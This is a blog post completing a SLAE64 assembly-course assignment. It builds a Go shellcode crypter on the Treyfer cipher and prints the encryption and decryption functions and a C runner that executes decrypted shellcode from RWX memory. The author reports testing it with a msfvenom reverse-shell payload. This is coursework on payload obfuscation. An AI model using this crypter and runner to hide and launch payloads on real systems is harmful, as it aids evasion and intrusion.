Title: SLAE64 - Assignment 7
Date: 2022-07-03T12:13:20.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><p>Below is the list of files containing the source code for this assignment:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/7/encrypt.go">encrypt.go</a>, the Go program that encrypts shellcode</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/7/decrypt.go">decrypt.go</a>, the Go program that decrypts and runs encrypted shellcode</li></ul><h2 id="foreword">Foreword</h2><p>For this assignment, I chose to implement an encryption algorithm named <em>Treyfer</em>.</p><p>I found it on Wikipedia while searching for entries related to the algorithm <em>Tiny Encryption Algorithm </em>(TAE).</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://en.wikipedia.org/wiki/Treyfer"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Treyfer - Wikipedia</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://en.wikipedia.org/static/apple-touch/wikipedia.png" alt=""><span class="kg-bookmark-author">Wikimedia Foundation, Inc.</span><span class="kg-bookmark-publisher">Contributors to Wikimedia projects</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/b/b4/Ambox_important.svg/40px-Ambox_important.svg.png" alt=""></div></a></figure><p>Looking at the source code, one can immediately notice that that it uses very few instructions:</p><pre><code class="language-cpp">#include &lt;stdint.h&gt;

#define NUMROUNDS 32
extern uint8_t const Sbox[256];

void treyfer_encrypt(uint8_t text[8], uint8_t const key[8])
{
    unsigned i;
    uint8_t t = text[0];
    for (i = 0; i &lt; 8*NUMROUNDS; i++) {
        t += key[i%8];
        t = Sbox[t] + text[(i+1)%8];
        text[(i+1) % 8] = t = (t &lt;&lt; 1) | (t &gt;&gt; 7);        /* Rotate left 1 bit */
    }
}</code></pre><p>Follows an excerpt taken from the Wikipedia page:</p><blockquote>Treyfer has a rather small <a href="https://en.wikipedia.org/wiki/Key_size">key size</a> and <a href="https://en.wikipedia.org/wiki/Block_size_(cryptography)">block size</a> of 64 bits each. All operations are byte-oriented, and there is a single 8×8-bit <a href="https://en.wikipedia.org/wiki/Substitution_box">S-box</a>.<br><br>The S-box is left undefined; the implementation can simply use whatever data is available in memory.<br><br>In each round, each byte has added to it the S-box value of the sum of a <a href="https://en.wikipedia.org/wiki/Key_(cryptography)">key</a> byte and the previous data byte, then it is rotated left one bit.<br><br>The design attempts to compensate for the simplicity of this round transformation by using 32 rounds.</blockquote><h2 id="security-considerations">Security Considerations</h2><p>According to Wikipedia, Treyfer was one of the first ciphers shown to be susceptible to a <em>slide attack</em>.</p><p>If you're curious about such attack, then a <a href="https://en.wikipedia.org/wiki/Slide_attack">quick search</a> on the Internet should clear your doubts:</p><blockquote>The <strong>slide attack</strong> is a form of <a href="https://en.wikipedia.org/wiki/Cryptanalysis">cryptanalysis</a> designed to deal with the prevailing idea that even weak <a href="https://en.wikipedia.org/wiki/Cipher">ciphers</a> can become very strong by increasing the number of rounds, which can ward off a <a href="https://en.wikipedia.org/wiki/Differential_attack">differential attack</a>.</blockquote><p>This means that we can't simply increase the number of rounds to make the cipher stronger against attacks.</p><h2 id="encrypting">Encrypting</h2><p>On the Wikipedia entry for this encryption algorithm, you can find a simple implementation written in C.</p><p>Converting that code to the Go language, I managed to write this function:</p><figure class="kg-card kg-code-card"><pre><code class="language-go">/*
References:
- https://en.wikipedia.org/wiki/Treyfer
*/
func treyfer_encrypt(text [8]byte, key [8]byte, sbox [256]byte) [8]byte {

    var t byte = text[0]

    for i := uint(0); i &lt; (8 * NUM_ROUNDS); i++ {

        t += key[i % 8]
        t = sbox[t] + text[(i + 1) % 8]
        t = bits.RotateLeft8(t, 1)
        text[(i+1) % 8] = t
    }

    return text
}</code></pre><figcaption>Encryption function</figcaption></figure><p>The function requires three arguments: a 8-bytes key, a chunk of 8 bytes of data, and an S-Box (<em>Substitution box</em>) made up of 256 bytes.</p><p>I chose to use an already existing S-Box, officially known as the <em>Rijndael S-Box</em>.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://en.wikipedia.org/wiki/Rijndael_S-box"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Rijndael S-box - Wikipedia</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://en.wikipedia.org/static/apple-touch/wikipedia.png" alt=""><span class="kg-bookmark-author">Wikimedia Foundation, Inc.</span><span class="kg-bookmark-publisher">Contributors to Wikimedia projects</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/78c56ffe89890582a7060845e131a788266cbd59" alt=""></div></a></figure><h2 id="decrypting">Decrypting</h2><p>For the decrypting function, I simply converted some C code I found on the Internet.</p><figure class="kg-card kg-code-card"><pre><code class="language-go">/*
References:
- https://stackoverflow.com/questions/37303176/encryption-implementation-confusing-results
*/
func treyfer_decrypt(text [8]byte, key [8]byte, sbox [256]byte) [8]byte {

    var top uint8 = 0;
    var bottom uint8 = 0;

    for j := uint(0); j &lt; NUM_ROUNDS; j++ {
        for i := 7; i &gt;= 0; i-- {

            top = text[i] + key[i];
            top = sbox[top];

            bottom = text[(i + 1) % 8];
            bottom = (bottom &gt;&gt; 1) | (bottom &lt;&lt; 7);

            text[(i + 1) % 8] = bottom - top;
        }
    }

    return text
       
}</code></pre><figcaption>Decryption function</figcaption></figure><p>Similarly to the encryption function, this one accepts the same three arguments, and returns eight bytes of decrypted data.</p><h2 id="shellcode-execution">Shellcode execution</h2><p>It seems that executing shellcode from Go isn't as straightforward as in C or C++. For this reason, I had to search for a workaround.</p><p>In the end, I found a <a href="https://medium.com/syscall59/a-trinity-of-shellcode-aes-go-f6cec854f992">method</a> that imports some C code which in turn uses the mmap and memcpy functions to move the shellcode to a new executable memory region, and then executes it.</p><p>Below is the C code:</p><figure class="kg-card kg-code-card"><pre><code class="language-go">/*
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

void run_shellcode(char *shellcode, size_t shellcode_length)
{
    if(fork())
    {
        return;
    }

    unsigned char *ptr;
    ptr = (unsigned char *) mmap(
        0,
        shellcode_length,
        PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_ANONYMOUS | MAP_PRIVATE,
        -1,
        0
    );

    if(ptr == MAP_FAILED)
    {
        perror("mmap");
        return;
    }

    memcpy(ptr, shellcode, shellcode_length);
    (*(void(*) ()) ptr)();
}
*/
import "C"</code></pre><figcaption>C code for running shellcode in Go</figcaption></figure><p>The weird thing about this syntax is that, even it it's a comment, the compiler still uses it. I suppose it's similar to how some programs use the comments above the functions to generate documentation about the code.</p><p>Anyway, once the C code is imported I can use like this to call the function defined in the comment:</p><figure class="kg-card kg-code-card"><pre><code class="language-go">if *run_shellcode {

    fmt.Printf("[+] Running the decrypted shellcode\n")

    shellode_pointer := &amp;decrypted_shellcode[0]
    shellcode_length := len(decrypted_shellcode)

    /*
    call the the function run_shellcode, with the arguments:
    - shellcode (address of the starting instruction to execute)
    - shellcode_length (length of the shellcode (used by mmap))
    */
    C.run_shellcode(
        (*C.char)(unsafe.Pointer(shellode_pointer)),
        (C.size_t)(shellcode_length))
}</code></pre><figcaption>Calling C code from Go</figcaption></figure><h2 id="testing">Testing</h2><p>During my tests I noticed something odd: running the shellcode for spawning a simple <code>/bin/sh</code> shell with <code>execve</code> doesn't work, at least with my implementation of the shellcode runner in the file <code>decrypt.go</code>.</p><p>Nonetheless, other shellcodes like <code>linux/x64/shell_reverse_tcp</code> from <code>msfvenom</code> seem to work pretty well, which makes me think it's not about the code, but something in the way Go manages child processes.</p><p>For this reason, the shellcode I used for my tests is the one I mentioned above, from the metasploit framework.</p><p>Below is a screenshot that demonstrates the encryption of the shellcode generated with <code>msfvenom</code>, located inside the file <code>shellcode.bin</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-10.png" class="kg-image" alt loading="lazy" width="1778" height="986" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-10.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-10.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/07/image-10.png 1600w, __GHOST_URL__/content/images/2022/07/image-10.png 1778w" sizes="(min-width: 720px) 720px"><figcaption>Testing the decryption program and the shellcode runner</figcaption></figure><p>As you can see, the decrypter successfully managed to run the shellcode, thus spawning a reverse shell on the other terminal window.</p>